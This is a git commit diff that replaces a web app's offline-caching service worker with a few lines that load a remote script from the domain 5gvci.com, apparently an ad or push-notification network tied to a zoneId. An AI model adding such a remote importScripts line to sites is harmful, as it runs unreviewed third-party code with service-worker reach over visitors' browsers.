8ed9e154e6bbf6faaafcd72e7e259fa6f2a6a429
Zpplai <156550483+Zpplai@users.noreply.github.com>
2026-04-03 23:06:18 -0300

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,25 +1,6 @@
-const CACHE_NAME = 'jogos360-v1';
-const assets = [
-  'Index.html',
-  'style.css',
-  'app.js',
-  'manifest.json',
-  'icon.png',
-  'icon-192.png'
-];
-
-self.addEventListener('install', (event) => {
-  event.waitUntil(
-    caches.open(CACHE_NAME).then((cache) => {
-      return cache.addAll(assets);
-    })
-  );
-});
-
-self.addEventListener('fetch', (event) => {
-  event.respondWith(
-    caches.match(event.request).then((response) => {
-      return response || fetch(event.request);
-    })
-  );
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10828449
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
